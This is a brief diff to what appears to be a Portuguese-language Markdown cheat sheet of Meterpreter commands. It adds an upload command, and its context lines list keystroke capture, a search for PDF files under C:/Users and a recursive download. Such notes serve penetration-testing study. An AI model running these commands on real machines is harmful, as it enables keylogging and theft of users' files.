@@ -71,6 +71,7 @@ keyscan_start
 keyscan_dump
 search -d C:/Users -f .pdf
 download -r caminho
+upload arquivo caminho
 ```
 
 
